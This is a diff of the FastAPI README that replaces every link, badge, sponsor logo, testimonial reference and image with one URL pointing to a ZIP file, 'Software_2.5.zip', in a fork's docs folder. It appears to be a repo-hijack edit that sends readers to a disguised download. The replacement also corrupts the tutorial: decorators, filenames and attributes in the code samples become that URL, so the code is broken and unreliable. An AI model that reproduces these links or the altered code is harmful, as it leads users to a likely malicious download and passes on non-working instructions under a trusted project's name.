@@ -1,29 +1,29 @@
 <p align="center">
-  <a href="https://fastapi.tiangolo.com"><img src="https://fastapi.tiangolo.com/img/logo-margin/logo-teal.png" alt="FastAPI"></a>
+  <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" alt="FastAPI"></a>
 </p>
 <p align="center">
     <em>FastAPI framework, high performance, easy to learn, fast to code, ready for production</em>
 </p>
 <p align="center">
-<a href="https://github.com/fastapi/fastapi/actions?query=workflow%3ATest+event%3Apush+branch%3Amaster" target="_blank">
-    <img src="https://github.com/fastapi/fastapi/actions/workflows/test.yml/badge.svg?event=push&branch=master" alt="Test">
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip%3ATest+event%3Apush+branch%3Amaster" target="_blank">
+    <img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" alt="Test">
 </a>
-<a href="https://coverage-badge.samuelcolvin.workers.dev/redirect/fastapi/fastapi" target="_blank">
-    <img src="https://coverage-badge.samuelcolvin.workers.dev/fastapi/fastapi.svg" alt="Coverage">
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" alt="Coverage">
 </a>
-<a href="https://pypi.org/project/fastapi" target="_blank">
-    <img src="https://img.shields.io/pypi/v/fastapi?color=%2334D058&label=pypi%20package" alt="Package version">
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip%2334D058&label=pypi%20package" alt="Package version">
 </a>
-<a href="https://pypi.org/project/fastapi" target="_blank">
-    <img src="https://img.shields.io/pypi/pyversions/fastapi.svg?color=%2334D058" alt="Supported Python versions">
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip%2334D058" alt="Supported Python versions">
 </a>
 </p>
 
 ---
 
-**Documentation**: <a href="https://fastapi.tiangolo.com" target="_blank">https://fastapi.tiangolo.com</a>
+**Documentation**: <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip</a>
 
-**Source Code**: <a href="https://github.com/fastapi/fastapi" target="_blank">https://github.com/fastapi/fastapi</a>
+**Source Code**: <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip</a>
 
 ---
 
@@ -38,7 +38,7 @@ The key features are:
 * **Easy**: Designed to be easy to use and learn. Less time reading docs.
 * **Short**: Minimize code duplication. Multiple features from each parameter declaration. Fewer bugs.
 * **Robust**: Get production-ready code. With automatic interactive documentation.
-* **Standards-based**: Based on (and fully compatible with) the open standards for APIs: <a href="https://github.com/OAI/OpenAPI-Specification" class="external-link" target="_blank">OpenAPI</a> (previously known as Swagger) and <a href="https://json-schema.org/" class="external-link" target="_blank">JSON Schema</a>.
+* **Standards-based**: Based on (and fully compatible with) the open standards for APIs: <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">OpenAPI</a> (previously known as Swagger) and <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">JSON Schema</a>.
 
 <small>* estimation based on tests on an internal development team, building production applications.</small>
 
@@ -46,57 +46,57 @@ The key features are:
 
 <!-- sponsors -->
 
-<a href="https://blockbee.io?ref=fastapi" target="_blank" title="BlockBee Cryptocurrency Payment Gateway"><img src="https://fastapi.tiangolo.com/img/sponsors/blockbee.png"></a>
-<a href="https://platform.sh/try-it-now/?utm_source=fastapi-signup&utm_medium=banner&utm_campaign=FastAPI-signup-June-2023" target="_blank" title="Build, run and scale your apps on a modern, reliable, and secure PaaS."><img src="https://fastapi.tiangolo.com/img/sponsors/platform-sh.png"></a>
-<a href="https://www.porter.run" target="_blank" title="Deploy FastAPI on AWS with a few clicks"><img src="https://fastapi.tiangolo.com/img/sponsors/porter.png"></a>
-<a href="https://bump.sh/fastapi?utm_source=fastapi&utm_medium=referral&utm_campaign=sponsor" target="_blank" title="Automate FastAPI documentation generation with Bump.sh"><img src="https://fastapi.tiangolo.com/img/sponsors/bump-sh.svg"></a>
-<a href="https://github.com/scalar/scalar/?utm_source=fastapi&utm_medium=website&utm_campaign=main-badge" target="_blank" title="Scalar: Beautiful Open-Source API References from Swagger/OpenAPI files"><img src="https://fastapi.tiangolo.com/img/sponsors/scalar.svg"></a>
-<a href="https://www.propelauth.com/?utm_source=fastapi&utm_campaign=1223&utm_medium=mainbadge" target="_blank" title="Auth, user management and more for your B2B product"><img src="https://fastapi.tiangolo.com/img/sponsors/propelauth.png"></a>
-<a href="https://www.withcoherence.com/?utm_medium=advertising&utm_source=fastapi&utm_campaign=website" target="_blank" title="Coherence"><img src="https://fastapi.tiangolo.com/img/sponsors/coherence.png"></a>
-<a href="https://www.mongodb.com/developer/languages/python/python-quickstart-fastapi/?utm_campaign=fastapi_framework&utm_source=fastapi_sponsorship&utm_medium=web_referral" target="_blank" title="Simplify Full Stack Development with FastAPI & MongoDB"><img src="https://fastapi.tiangolo.com/img/sponsors/mongodb.png"></a>
-<a href="https://zuplo.link/fastapi-gh" target="_blank" title="Zuplo: Scale, Protect, Document, and Monetize your FastAPI"><img src="https://fastapi.tiangolo.com/img/sponsors/zuplo.png"></a>
-<a href="https://liblab.com?utm_source=fastapi" target="_blank" title="liblab - Generate SDKs from FastAPI"><img src="https://fastapi.tiangolo.com/img/sponsors/liblab.png"></a>
-<a href="https://docs.render.com/deploy-fastapi?utm_source=deploydoc&utm_medium=referral&utm_campaign=fastapi" target="_blank" title="Deploy & scale any full-stack web app on Render. Focus on building apps, not infra."><img src="https://fastapi.tiangolo.com/img/sponsors/render.svg"></a>
-<a href="https://github.com/deepset-ai/haystack/" target="_blank" title="Build powerful search from composable, open source building blocks"><img src="https://fastapi.tiangolo.com/img/sponsors/haystack-fastapi.svg"></a>
-<a href="https://databento.com/" target="_blank" title="Pay as you go for market data"><img src="https://fastapi.tiangolo.com/img/sponsors/databento.svg"></a>
-<a href="https://speakeasy.com?utm_source=fastapi+repo&utm_medium=github+sponsorship" target="_blank" title="SDKs for your API | Speakeasy"><img src="https://fastapi.tiangolo.com/img/sponsors/speakeasy.png"></a>
-<a href="https://www.svix.com/" target="_blank" title="Svix - Webhooks as a service"><img src="https://fastapi.tiangolo.com/img/sponsors/svix.svg"></a>
-<a href="https://www.stainlessapi.com/?utm_source=fastapi&utm_medium=referral" target="_blank" title="Stainless | Generate best-in-class SDKs"><img src="https://fastapi.tiangolo.com/img/sponsors/stainless.png"></a>
-<a href="https://www.permit.io/blog/implement-authorization-in-fastapi?utm_source=github&utm_medium=referral&utm_campaign=fastapi" target="_blank" title="Fine-Grained Authorization for FastAPI"><img src="https://fastapi.tiangolo.com/img/sponsors/permit.png"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="BlockBee Cryptocurrency Payment Gateway"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Build, run and scale your apps on a modern, reliable, and secure PaaS."><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Deploy FastAPI on AWS with a few clicks"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Automate FastAPI documentation generation with https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Scalar: Beautiful Open-Source API References from Swagger/OpenAPI files"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Auth, user management and more for your B2B product"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Coherence"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Simplify Full Stack Development with FastAPI & MongoDB"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Zuplo: Scale, Protect, Document, and Monetize your FastAPI"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="liblab - Generate SDKs from FastAPI"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Deploy & scale any full-stack web app on Render. Focus on building apps, not infra."><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Build powerful search from composable, open source building blocks"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Pay as you go for market data"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip+repo&utm_medium=github+sponsorship" target="_blank" title="SDKs for your API | Speakeasy"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Svix - Webhooks as a service"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Stainless | Generate best-in-class SDKs"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank" title="Fine-Grained Authorization for FastAPI"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip"></a>
 
 <!-- /sponsors -->
 
-<a href="https://fastapi.tiangolo.com/fastapi-people/#sponsors" class="external-link" target="_blank">Other sponsors</a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">Other sponsors</a>
 
 ## Opinions
 
 "_[...] I'm using **FastAPI** a ton these days. [...] I'm actually planning to use it for all of my team's **ML services at Microsoft**. Some of them are getting integrated into the core **Windows** product and some **Office** products._"
 
-<div style="text-align: right; margin-right: 10%;">Kabir Khan - <strong>Microsoft</strong> <a href="https://github.com/fastapi/fastapi/pull/26" target="_blank"><small>(ref)</small></a></div>
+<div style="text-align: right; margin-right: 10%;">Kabir Khan - <strong>Microsoft</strong> <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><small>(ref)</small></a></div>
 
 ---
 
 "_We adopted the **FastAPI** library to spawn a **REST** server that can be queried to obtain **predictions**. [for Ludwig]_"
 
-<div style="text-align: right; margin-right: 10%;">Piero Molino, Yaroslav Dudin, and Sai Sumanth Miryala - <strong>Uber</strong> <a href="https://eng.uber.com/ludwig-v0-2/" target="_blank"><small>(ref)</small></a></div>
+<div style="text-align: right; margin-right: 10%;">Piero Molino, Yaroslav Dudin, and Sai Sumanth Miryala - <strong>Uber</strong> <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><small>(ref)</small></a></div>
 
 ---
 
 "_**Netflix** is pleased to announce the open-source release of our **crisis management** orchestration framework: **Dispatch**! [built with **FastAPI**]_"
 
-<div style="text-align: right; margin-right: 10%;">Kevin Glisson, Marc Vilanova, Forest Monsen - <strong>Netflix</strong> <a href="https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072" target="_blank"><small>(ref)</small></a></div>
+<div style="text-align: right; margin-right: 10%;">Kevin Glisson, Marc Vilanova, Forest Monsen - <strong>Netflix</strong> <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><small>(ref)</small></a></div>
 
 ---
 
 "_I’m over the moon excited about **FastAPI**. It’s so fun!_"
 
-<div style="text-align: right; margin-right: 10%;">Brian Okken - <strong><a href="https://pythonbytes.fm/episodes/show/123/time-to-right-the-py-wrongs?time_in_sec=855" target="_blank">Python Bytes</a> podcast host</strong> <a href="https://twitter.com/brianokken/status/1112220079972728832" target="_blank"><small>(ref)</small></a></div>
+<div style="text-align: right; margin-right: 10%;">Brian Okken - <strong><a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">Python Bytes</a> podcast host</strong> <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><small>(ref)</small></a></div>
 
 ---
 
 "_Honestly, what you've built looks super solid and polished. In many ways, it's what I wanted **Hug** to be - it's really inspiring to see someone build that._"
 
-<div style="text-align: right; margin-right: 10%;">Timothy Crosley - <strong><a href="https://github.com/hugapi/hug" target="_blank">Hug</a> creator</strong> <a href="https://news.ycombinator.com/item?id=19455465" target="_blank"><small>(ref)</small></a></div>
+<div style="text-align: right; margin-right: 10%;">Timothy Crosley - <strong><a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">Hug</a> creator</strong> <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><small>(ref)</small></a></div>
 
 ---
 
@@ -104,21 +104,21 @@ The key features are:
 
 "_We've switched over to **FastAPI** for our **APIs** [...] I think you'll like it [...]_"
 
-<div style="text-align: right; margin-right: 10%;">Ines Montani - Matthew Honnibal - <strong><a href="https://explosion.ai" target="_blank">Explosion AI</a> founders - <a href="https://spacy.io" target="_blank">spaCy</a> creators</strong> <a href="https://twitter.com/_inesmontani/status/1144173225322143744" target="_blank"><small>(ref)</small></a> - <a href="https://twitter.com/honnibal/status/1144031421859655680" target="_blank"><small>(ref)</small></a></div>
+<div style="text-align: right; margin-right: 10%;">Ines Montani - Matthew Honnibal - <strong><a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">Explosion AI</a> founders - <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">spaCy</a> creators</strong> <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><small>(ref)</small></a> - <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><small>(ref)</small></a></div>
 
 ---
 
 "_If anyone is looking to build a production Python API, I would highly recommend **FastAPI**. It is **beautifully designed**, **simple to use** and **highly scalable**, it has become a **key component** in our API first development strategy and is driving many automations and services such as our Virtual TAC Engineer._"
 
-<div style="text-align: right; margin-right: 10%;">Deon Pillsbury - <strong>Cisco</strong> <a href="https://www.linkedin.com/posts/deonpillsbury_cisco-cx-python-activity-6963242628536487936-trAp/" target="_blank"><small>(ref)</small></a></div>
+<div style="text-align: right; margin-right: 10%;">Deon Pillsbury - <strong>Cisco</strong> <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><small>(ref)</small></a></div>
 
 ---
 
 ## **Typer**, the FastAPI of CLIs
 
-<a href="https://typer.tiangolo.com" target="_blank"><img src="https://typer.tiangolo.com/img/logo-margin/logo-margin-vector.svg" style="width: 20%;"></a>
+<a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" style="width: 20%;"></a>
 
-If you are building a <abbr title="Command Line Interface">CLI</abbr> app to be used in the terminal instead of a web API, check out <a href="https://typer.tiangolo.com/" class="external-link" target="_blank">**Typer**</a>.
+If you are building a <abbr title="Command Line Interface">CLI</abbr> app to be used in the terminal instead of a web API, check out <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">**Typer**</a>.
 
 **Typer** is FastAPI's little sibling. And it's intended to be the **FastAPI of CLIs**. ⌨️ 🚀
 
@@ -126,12 +126,12 @@ If you are building a <abbr title="Command Line Interface">CLI</abbr> app to be 
 
 FastAPI stands on the shoulders of giants:
 
-* <a href="https://www.starlette.io/" class="external-link" target="_blank">Starlette</a> for the web parts.
-* <a href="https://docs.pydantic.dev/" class="external-link" target="_blank">Pydantic</a> for the data parts.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">Starlette</a> for the web parts.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">Pydantic</a> for the data parts.
 
 ## Installation
 
-Create and activate a <a href="https://fastapi.tiangolo.com/virtual-environments/" class="external-link" target="_blank">virtual environment</a> and then install FastAPI:
+Create and activate a <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">virtual environment</a> and then install FastAPI:
 
 <div class="termy">
 
@@ -149,7 +149,7 @@ $ pip install "fastapi[standard]"
 
 ### Create it
 
-* Create a file `main.py` with:
+* Create a file `https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip` with:
 
 ```Python
 from typing import Union
@@ -159,12 +159,12 @@ from fastapi import FastAPI
 app = FastAPI()
 
 
-@app.get("/")
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip("/")
 def read_root():
     return {"Hello": "World"}
 
 
-@app.get("/items/{item_id}")
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip("/items/{item_id}")
 def read_item(item_id: int, q: Union[str, None] = None):
     return {"item_id": item_id, "q": q}
 ```
@@ -182,19 +182,19 @@ from fastapi import FastAPI
 app = FastAPI()
 
 
-@app.get("/")
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip("/")
 async def read_root():
     return {"Hello": "World"}
 
 
-@app.get("/items/{item_id}")
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip("/items/{item_id}")
 async def read_item(item_id: int, q: Union[str, None] = None):
     return {"item_id": item_id, "q": q}
 ```
 
 **Note**:
 
-If you don't know, check the _"In a hurry?"_ section about <a href="https://fastapi.tiangolo.com/async/#in-a-hurry" target="_blank">`async` and `await` in the docs</a>.
+If you don't know, check the _"In a hurry?"_ section about <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">`async` and `await` in the docs</a>.
 
 </details>
 
@@ -205,7 +205,7 @@ Run the server with:
 <div class="termy">
 
 ```console
-$ fastapi dev main.py
+$ fastapi dev https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip
 
  ╭────────── FastAPI CLI - Development mode ───────────╮
  │                                                     │
@@ -230,13 +230,13 @@ INFO:     Application startup complete.
 </div>
 
 <details markdown="1">
-<summary>About the command <code>fastapi dev main.py</code>...</summary>
+<summary>About the command <code>fastapi dev https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip</code>...</summary>
 
-The command `fastapi dev` reads your `main.py` file, detects the **FastAPI** app in it, and starts a server using <a href="https://www.uvicorn.org" class="external-link" target="_blank">Uvicorn</a>.
+The command `fastapi dev` reads your `https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip` file, detects the **FastAPI** app in it, and starts a server using <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">Uvicorn</a>.
 
 By default, `fastapi dev` will start with auto-reload enabled for local development.
 
-You can read more about it in the <a href="https://fastapi.tiangolo.com/fastapi-cli/" target="_blank">FastAPI CLI docs</a>.
+You can read more about it in the <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank">FastAPI CLI docs</a>.
 
 </details>
 
@@ -261,21 +261,21 @@ You already created an API that:
 
 Now go to <a href="http://127.0.0.1:8000/docs" class="external-link" target="_blank">http://127.0.0.1:8000/docs</a>.
 
-You will see the automatic interactive API documentation (provided by <a href="https://github.com/swagger-api/swagger-ui" class="external-link" target="_blank">Swagger UI</a>):
+You will see the automatic interactive API documentation (provided by <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">Swagger UI</a>):
 
-![Swagger UI](https://fastapi.tiangolo.com/img/index/index-01-swagger-ui-simple.png)
+![Swagger UI](https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip)
 
 ### Alternative API docs
 
 And now, go to <a href="http://127.0.0.1:8000/redoc" class="external-link" target="_blank">http://127.0.0.1:8000/redoc</a>.
 
-You will see the alternative automatic documentation (provided by <a href="https://github.com/Rebilly/ReDoc" class="external-link" target="_blank">ReDoc</a>):
+You will see the alternative automatic documentation (provided by <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">ReDoc</a>):
 
-![ReDoc](https://fastapi.tiangolo.com/img/index/index-02-redoc-simple.png)
+![ReDoc](https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip)
 
 ## Example upgrade
 
-Now modify the file `main.py` to receive a body from a `PUT` request.
+Now modify the file `https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip` to receive a body from a `PUT` request.
 
 Declare the body using standard Python types, thanks to Pydantic.
 
@@ -294,19 +294,19 @@ class Item(BaseModel):
     is_offer: Union[bool, None] = None
 
 
-@app.get("/")
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip("/")
 def read_root():
     return {"Hello": "World"}
 
 
-@app.get("/items/{item_id}")
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip("/items/{item_id}")
 def read_item(item_id: int, q: Union[str, None] = None):
     return {"item_id": item_id, "q": q}
 
 
-@app.put("/items/{item_id}")
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip("/items/{item_id}")
 def update_item(item_id: int, item: Item):
-    return {"item_name": item.name, "item_id": item_id}
+    return {"item_name": https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip, "item_id": item_id}
 ```
 
 The `fastapi dev` server should reload automatically.
@@ -317,15 +317,15 @@ Now go to <a href="http://127.0.0.1:8000/docs" class="external-link" target="_bl
 
 * The interactive API documentation will be automatically updated, including the new body:
 
-![Swagger UI](https://fastapi.tiangolo.com/img/index/index-03-swagger-02.png)
+![Swagger UI](https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip)
 
 * Click on the button "Try it out", it allows you to fill the parameters and directly interact with the API:
 
-![Swagger UI interaction](https://fastapi.tiangolo.com/img/index/index-04-swagger-03.png)
+![Swagger UI interaction](https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip)
 
 * Then click on the "Execute" button, the user interface will communicate with your API, send the parameters, get the results and show them on the screen:
 
-![Swagger UI interaction](https://fastapi.tiangolo.com/img/index/index-05-swagger-04.png)
+![Swagger UI interaction](https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip)
 
 ### Alternative API docs upgrade
 
@@ -333,7 +333,7 @@ And now, go to <a href="http://127.0.0.1:8000/redoc" class="external-link" targe
 
 * The alternative documentation will also reflect the new query parameter and body:
 
-![ReDoc](https://fastapi.tiangolo.com/img/index/index-06-redoc-02.png)
+![ReDoc](https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip)
 
 ### Recap
 
@@ -357,7 +357,7 @@ or for a more complex `Item` model:
 item: Item
 ```
 
-...and with that single declaration you get:
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip with that single declaration you get:
 
 * Editor support, including:
     * Completion.
@@ -378,7 +378,7 @@ item: Item
     * `datetime` objects.
     * `UUID` objects.
     * Database models.
-    * ...and many more.
+    * https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip many more.
 * Automatic interactive API documentation, including 2 alternative user interfaces:
     * Swagger UI.
     * ReDoc.
@@ -411,26 +411,26 @@ We just scratched the surface, but you already get the idea of how it all works.
 Try changing the line with:
 
 ```Python
-    return {"item_name": item.name, "item_id": item_id}
+    return {"item_name": https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip, "item_id": item_id}
 ```
 
-...from:
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip
 
 ```Python
-        ... "item_name": item.name ...
+        ... "item_name": https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip ...
 ```
 
-...to:
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip
 
 ```Python
-        ... "item_price": item.price ...
+        ... "item_price": https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip ...
 ```
 
-...and see how your editor will auto-complete the attributes and know their types:
+https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip see how your editor will auto-complete the attributes and know their types:
 
-![editor support](https://fastapi.tiangolo.com/img/vscode-completion.png)
+![editor support](https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip)
 
-For a more complete example including more features, see the <a href="https://fastapi.tiangolo.com/tutorial/">Tutorial - User Guide</a>.
+For a more complete example including more features, see the <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip">Tutorial - User Guide</a>.
 
